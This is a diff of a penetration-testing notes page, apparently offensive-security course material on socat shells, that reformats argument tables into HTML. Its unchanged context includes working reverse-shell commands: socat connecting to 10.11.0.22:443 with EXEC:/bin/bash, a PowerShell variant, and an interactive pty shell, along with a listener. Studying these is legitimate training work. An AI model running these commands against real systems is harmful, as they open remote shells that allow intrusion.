@@ -21,11 +21,7 @@ C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
 ... socat[4388] N listening on AF=2 0.0.0.0:443
 ```
 
-| Argument            | Description                                          |
-| ------------------- | ---------------------------------------------------- |
-| `-d -d`             | Increase verbosity                                   |
-| `TCP-LISTEN:{PORT}` | Declare a listener at `{PORT}`                       |
-| `STDOUT`            | Connect standard output (`STDOUT`) to the TCP socket |
+<table><thead><tr><th width="220">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>-d -d</code></td><td>Increase verbosity</td></tr><tr><td><code>TCP-LISTEN:{PORT}</code></td><td>Declare a listener at <code>{PORT}</code></td></tr><tr><td><code>STDOUT</code></td><td>Connect standard output (<code>STDOUT</code>) to the TCP socket</td></tr></tbody></table>
 
 ### Target Machine
 
@@ -35,14 +31,12 @@ C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
 kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
 ```
 
-| Argument           | Description                                                                                        |
-| ------------------ | -------------------------------------------------------------------------------------------------- |
-| `TCP4:{IP}:{PORT}` | Specify the location to reach out                                                                  |
-| `EXEC:{PATH}`      | <p>Specifies an executable to pipe socat into.<br><br>Similar to netcat's <code>-e</code> flag</p> |
+<table><thead><tr><th width="213">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>TCP4:{IP}:{PORT}</code></td><td>Specify the location to reach out</td></tr><tr><td><code>EXEC:{PATH}</code></td><td>Specifies an executable to pipe socat into.<br><br>Similar to netcat's <code>-e</code> flag</td></tr></tbody></table>
 
 #### Windows Target:
 
-<pre class="language-powershell"><code class="lang-powershell"><strong>C:\Users\offsec> socat TCP:0{IP}:{PORT} EXEC:powershell.exe,pipes</strong></code></pre>
+<pre class="language-powershell"><code class="lang-powershell"><strong>C:\Users\offsec> socat TCP:0{IP}:{PORT} EXEC:powershell.exe,pipes
+</strong></code></pre>
 
 * `pipes` option is used to force powershell (or `cmd.exe`) to use Unix style standard input and output
 
@@ -66,14 +60,7 @@ $ socat TCP4:{Listen-IP}:{Listen-PORT} EXEC:"bash -li",pty,stderr,sigint,setsid,
 ```
 {% endcode %}
 
-| Argument          | Description                                                                                                                                                                            |
-| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `EXEC:"bash -li"` | <p>Creates an interactive bash session (arguments and purpose listed below).<br><br><code>-li</code> flag launches an <em>interactive</em> shell in <em>login</em> invocation mode</p> |
-| `pty`             | Allocates a pseudo-terminal on the target                                                                                                                                              |
-| `stderr`          | Makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)                                                                                |
-| `sigint`          | Passes any `Ctrl + C` commands through into the sub-process, allowing users to kill commands inside the shell                                                                          |
-| `setsid`          | Creates the process in a new session                                                                                                                                                   |
-| `sane`            | Stabilizes the terminal, attempting to "normalize" it.                                                                                                                                 |
+<table><thead><tr><th width="200">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>EXEC:"bash -li"</code></td><td>Creates an interactive bash session (arguments and purpose listed below).<br><br><code>-li</code> flag launches an <em>interactive</em> shell in <em>login</em> invocation mode</td></tr><tr><td><code>pty</code></td><td>Allocates a pseudo-terminal on the target</td></tr><tr><td><code>stderr</code></td><td>Makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)</td></tr><tr><td><code>sigint</code></td><td>Passes any <code>Ctrl + C</code> commands through into the sub-process, allowing users to kill commands inside the shell</td></tr><tr><td><code>setsid</code></td><td>Creates the process in a new session</td></tr><tr><td><code>sane</code></td><td>Stabilizes the terminal, attempting to "normalize" it.</td></tr></tbody></table>
 
 ## Encrypted Shell
 
